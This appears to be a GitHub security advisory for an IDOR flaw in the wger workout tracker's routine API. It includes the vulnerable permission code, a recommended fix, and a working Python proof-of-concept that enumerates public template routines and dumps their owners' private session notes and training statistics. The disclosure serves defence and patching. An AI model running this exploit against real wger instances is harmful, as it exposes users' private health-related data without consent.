# [H] wger Vulnerable to IDOR: Authenticated Users Can Read Any User's Private Workout Session Data via Template Routine API

## Summary
Severity: High
Advisory: GHSA-cj9g-27ph-4cgv
CVE: CVE-2026-43977
CWE: CWE-200, CWE-284
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-cj9g-27ph-4cgv
Type: github-advisory

## Affected
- PyPI: `wger` — affected >=0

## Details
### Summary 
Any authenticated user can read another user's private workout session notes, exercise history, and training statistics by calling the /logs/ and /stats/ actions on a routine they do not own.

The RoutinePermission class grants read access to any authenticated user when a routine has is_template=True, regardless of ownership. The /logs/ and /stats/ API actions use the same permission check but return the routine owner's personal training data instead of the requesting user's data, creating an insecure direct object reference (IDOR).

An attacker with a free account can enumerate all public template routine IDs via GET /api/v2/routine/?is_template=true, then call 
GET /api/v2/routine/{id}/logs/ and GET /api/v2/routine/{id}/stats/ to access the owner's private health data including workout notes, weights, repetitions, and performance statistics.

### Description

wger exposes a REST API endpoint that allows any authenticated user to retrieve the **private workout session notes, exercise logs, and training statistics** belonging to another user, as long as that user has at least one routine marked as a public template.

The vulnerability exists in `RoutineViewSet` (`wger/manager/api/views.py`). The view defines two custom actions  `/logs/` and `/stats/`  that are intended to return data for the **requesting user's own** training history within a routine. However, the underlying permission check (`RoutinePermission.has_object_permission`) grants read access to **any** authenticated user when the routine has `is_template=True`, regardless of ownership. When the `/logs/` or `/stats/` actions are invoked against a routine the attacker does not own, they return the **owner's** private workout history, not the attacker's.

### Root Cause

**File:** `wger/manager/api/permissions.py`, lines 30–41

```python
def has_object_permission(self, request, view, obj):
    if obj.user == request.user:
        return True

    if obj.is_template:                                  # ← any template is readable
        return request.method in permissions.SAFE_METHODS  # by any authenticated user

    return False
```

**File:** `wger/manager/api/views.py`, lines 173–199

```python
@action(detail=True, url_path='logs')
def logs(self, request, pk):
    out = LogDisplaySerializer(
        self.get_object().logs_display(),   # ← returns OWNER's logs, not request.user's
        many=True,
    ).data
    return Response(out)

@action(detail=True, url_path='stats')
def stats(self, request, pk):
    out = LogStatsDataSerializer(
        self.get_object().calculate_log_statistics()  # ← owner's statistics
    ).data
    return Response(out)
```

`self.get_object()` retrieves the routine belonging to the **owner** (e.g., user A). Since `is_template=True` passes the permission check for any authenticated user, the attacker's request reaches `logs_display()` and `calculate_log_statistics()`, which return the **owner's** workout history, not the attacker's.

The intended behavior is that templates are public workout *plans* (exercise structure, sets, reps), but the `/logs/` and `/stats/` actions expose the *owner's personal training history* logged against that plan.


### Impact

An authenticated attacker can:

1. **Enumerate** all public template routines across all users:
   `GET /api/v2/routine/?is_template=true&is_public=true`

2. **Read private workout session notes** (freeform text entered by the victim after each workout session)

3. **Read full workout history** including exercise names, weights, repetitions, and dates

4. **Read training statistics** including volume, intensity, and set counts per muscle group and mesocycle

This data is health-related and personal. Under GDPR and similar regulations, unauthorized access to personal health data constitutes a data breach.


### Proof of Concept

#### Scenario

There are two users in the system:

- **alice** : a regular wger user who has been using the platform for months. She created a routine called "My 5/3/1 Program" and marked it as a public template so others can copy her exercise structure. She logs all her workouts with personal notes after each session.

- **bob** :  a second registered user who has never interacted with alice's account.

**The attack:**

Bob calls the routine listing endpoint to find all public templates. He gets back alice's routine ID. He then calls `/api/v2/routine/{id}/logs/`  an endpoint that should only show his own logs but instead receives alice's full workout history, including all her session notes ("Felt strong today, PR on squat"), weights, and performance data.

Bob does **not** need to know alice's username. He only needs her routine ID, which is a sequential integer discoverable by iterating `?is_template=true`.

#### Step-by-step

1. Bob registers a free account on the wger instance and obtains a JWT access token via `POST /api/v2/token`.

2. Bob calls `GET /api/v2/routine/?is_template=true&is_public=true` this lists all public template routines from **all users** across the platform, including their IDs.

3. For each routine ID returned, Bob calls `GET /api/v2/routine/{id}/logs/`  this returns the **routine owner's** workout sessions, including freeform personal notes and all logged exercises with weights and reps.

4. Bob calls `GET /api/v2/routine/{id}/stats/` to get aggregated statistics (total volume, intensity by muscle group, weekly progression) for the routine's owner.

No special permissions are needed. A fresh account (1-minute-old) can exploit this.

#### Python PoC

```python
#!/usr/bin/env python3
"""
PoC: IDOR - Workout Session Data Exposure via Template Routine API
Affected: wger <= 2.5.0a2
Target:   GET /api/v2/routine/{id}/logs/
          GET /api/v2/routine/{id}/stats/
"""

import requests
import json

BASE_URL = "http://TARGET_IP"  # replace with target


def get_token(username, password):
    r = requests.post(
        f"{BASE_URL}/api/v2/token",
        json={"username": username, "password": password},
    )
    r.raise_for_status()
    return r.json()["access"]


def exploit(attacker_token):
    headers = {"Authorization": f"Bearer {attacker_token}"}

    # Step 1: Enumerate all public template routines (from ALL users)
    print("[*] Step 1: Enumerating public template routines...")
    r = requests.get(
        f"{BASE_URL}/api/v2/routine/",
        params={"is_template": "true", "is_public": "true"},
        headers=headers,
    )
    routines = r.json().get("results", [])
    print(f"[+] Found {len(routines)} public template routine(s)\n")

    for routine in routines:
        routine_id = routine["id"]
        routine_name = routine["name"]
        print(f"[*] Targeting routine #{routine_id}: '{routine_name}'")

        # Step 2: Fetch the OWNER's workout session logs (IDOR)
        logs_r = requests.get(
            f"{BASE_URL}/api/v2/routine/{routine_id}/logs/",
            headers=headers,
        )

        if logs_r.status_code == 200:
            sessions = logs_r.json()
            print(f"[+] VULNERABLE! Got {len(sessions)} session(s):")
            for session in sessions:
                s = session.get("session", {})
                print(f"    Date:       {s.get('date')}")
                print(f"    Notes:      {s.get('notes')}")   # ← private user notes
                print(f"    Impression: {s.get('impression')}")
                print(f"    Logs:       {len(session.get('logs', []))} exercise entries")
                print()

        # Step 3: Fetch the OWNER's training statistics (IDOR)
        stats_r = requests.get(
            f"{BASE_URL}/api/v2/routine/{routine_id}/stats/",
            headers=headers,
        )

        if stats_r.status_code == 200:
            stats = stats_r.json()
            print(f"[+] Training statistics for routine #{routine_id}:")
            volume = stats.get("volume", {}).get("mesocycle", {})
            print(f"    Total volume:      {volume.get('total')} kg")
            print(f"    Upper body volume: {volume.get('upper_body')} kg")
            print(f"    Lower body volume: {volume.get('lower_body')} kg")
            print()

        print("-" * 60)


if __name__ == "__main__":
    # Attacker uses their OWN credentials (no privilege needed)
    print("[*] Authenticating as attacker (bob)...")
    token = get_token("bob", "bobpassword")
    print(f"[+] Token acquired\n")

    exploit(token)
```

#### Expected output

```
[*] Authenticating as attacker (bob)...
[+] Token acquired

[*] Step 1: Enumerating public template routines...
[+] Found 1 public template routine(s)

[*] Targeting routine #1: 'Admin Secret Routine'
[+] VULNERABLE! Got 1 session(s):
    Date:       2024-06-15
    Notes:      SECRET workout note      ← alice's private note
    Impression: 3
    Logs:       0 exercise entries

[+] Training statistics for routine #1:
    Total volume:      0.00 kg
    Upper body volume: 0.00 kg
    Lower body volume: 0.00 kg
```

<img width="671" height="594" alt="image" src="https://github.com/user-attachments/assets/473cfd87-a63a-452d-a4f3-1aad23c4be24" />


### Recommended Fix

The `/logs/` and `/stats/` actions must filter results to the **requesting user**, not the routine owner.

```python
# wger/manager/api/views.py

@action(detail=True, url_path='logs')
def logs(self, request, pk):
    routine = self.get_object()
    # Only return logs for the requesting user, regardless of routine ownership
    out = LogDisplaySerializer(
        routine.logs_display(user=request.user),
        many=True,
    ).data
    return Response(out)

@action(detail=True, url_path='stats')
def stats(self, request, pk):
    routine = self.get_object()
    out = LogStatsDataSerializer(
        routine.calculate_log_statistics(user=request.user)
    ).data
    return Response(out)
```

Additionally, `RoutinePermission.has_object_permission` should explicitly deny access to the `/logs/` and `/stats/` actions for non-owners, regardless of `is_template`:

```python
def has_object_permission(self, request, view, obj):
    if obj.user == request.user:
        return True

    # Template routines are readable, but only their structure 
    # never their owner's personal training history
    if obj.is_template and view.action not in ('logs', 'stats'):
        return request.method in permissions.SAFE_METHODS

    return False
```

## References
- https://github.com/wger-project/wger/security/advisories/GHSA-cj9g-27ph-4cgv
- https://github.com/wger-project/wger
